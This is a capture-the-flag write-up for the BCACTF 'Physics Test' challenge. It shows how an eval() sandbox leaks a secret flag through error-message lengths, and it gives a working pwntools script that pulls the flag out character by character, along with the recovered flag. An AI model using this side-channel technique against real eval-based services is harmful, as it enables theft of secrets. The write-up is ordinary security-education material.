# BCACTF 5.0

## Physics Test

> Help me get an A in Physics! My teacher made this review program for us.
> 
> Author: Marvin
> 

Tags: _misc_

## Solution
This time we don't have attachments but only a `nc connection`. After connecting we are in a physics quiz.

```bash
Welcome to the Midterm Review!
This review will test your knowledge of physics formulas we have learned this unit.
Be sure to write all of your answers in terms of x and y!


---------------------------------------------------------------------


Question 1: A box starts at rest on a frictionless table. It has a constant acceleration of x. How far does it travel in y seconds?
Answer:
```

By trying out various inputs we can gather a bit of informations about how our answer is evaluated. We see that the answer is put through `eval` but most `builtins` removed (except `ord` and `len`). Also variables `x`, `y` and `flag` are passed to it.

```bash
Answer: qwe
Running tests...
Traceback (most recent call last):
  File "/home/ctf/physics-test.py", line 32, in <module>
    res = eval(answer, {'__builtins__': None, 'ord': ord, 'len': len}, {'x': x, 'y': y, 'flag': flag})
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not subscriptable
```

If we put `flag` as answer we get another error. Interestingly we can leak information about the flag by putting `ord(flag)` to the eval.

```bash
Answer: flag
Running tests...
Traceback (most recent call last):
  File "/home/ctf/physics-test.py", line 33, in <module>
    if abs(expected - res) > 0.1:
           ~~~~~~~~~^~~~~
TypeError: unsupported operand type(s) for -: 'int' and 'str'
```

Interestingly we can leak information about the flag by putting `ord(flag)` to the eval. This in fact gives us the length of the flag, which is `33` characters long.

```bash
Answer: ord(flag)
Running tests...
Traceback (most recent call last):
  File "/home/ctf/physics-test.py", line 32, in <module>
    res = eval(answer, {'__builtins__': None, 'ord': ord, 'len': len}, {'x': x, 'y': y, 'flag': flag})
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
TypeError: ord() expected a character, but string of length 33 found
```

Nice, with this we can exfiltrate the full flag by passing `ord(flag*ord(flag[0]))`. The `*` operator used with a string, duplicates the string `n` times. So `'a'*3` would be `'aaa'` etc.. The code above duplicates the flag `ord(flag[0])` times, whereas `ord(flag[0])` is the ascii code of the first character of the flag. We when divide the leaked result by the length of the flag to get the ascii code of the flag character back.

```bash
Answer: ord(flag*ord(flag[0]))
Running tests...
Traceback (most recent call last):
  File "/home/ctf/physics-test.py", line 32, in <module>
    res = eval(answer, {'__builtins__': None, 'ord': ord, 'len': len}, {'x': x, 'y': y, 'flag': flag})
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
TypeError: ord() expected a character, but string of length 3234 found
```

We got `3234`, divided by the flag length `33` we have `98` which is the ascii code for `b`. Since we don't want to do this manually, we write a script for this.

```bash
from pwn import *

# query ord(flag)
LEN = 33

def fetch(char):
    p = remote("challs.bcactf.com", 30586)
    p.sendlineafter(b"Answer: ", f"ord(flag*ord(flag[{char}]))".encode())
    p.recvuntil(b"but string of length ")
    flag_char = int(p.recvline().split()[0])//LEN
    print(chr(flag_char),end="")

for i in range(LEN):
    fetch(i)
```

Running this gives us the flag:
```bash
$ python foo.py SILENT=1
bcactf{yoU_p4ssED_b0ef030870ec18}
```

Flag `bcactf{yoU_p4ssED_b0ef030870ec18}`